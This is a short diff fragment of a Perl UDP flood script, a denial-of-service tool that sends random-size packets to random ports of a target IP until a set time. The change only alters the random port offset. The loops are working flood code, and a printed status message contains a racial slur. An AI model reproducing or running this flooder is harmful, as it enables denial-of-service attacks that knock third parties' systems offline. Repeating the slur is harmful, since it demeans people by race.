@@ -20,12 +20,12 @@ print "~You are niggering the ip: $ip " . ($port ? $port : "random") . " With " 
   
 for (;time() <= $endtime;) {
 $psize = $size ? $size : int(rand(1024-64)+64) ;
-$pport = $port ? $port : int(rand(6550000))+1;
+$pport = $port ? $port : int(rand(6550000))+10;
      
 send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
 $iaddr));}for (;time() <= $endtime;) {
 $psize = $size ? $size : int(rand(1024-64)+64) ;
-$pport = $port ? $port : int(rand(6550000))+1;
+$pport = $port ? $port : int(rand(6550000))+10;
  
 send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
 $iaddr));}
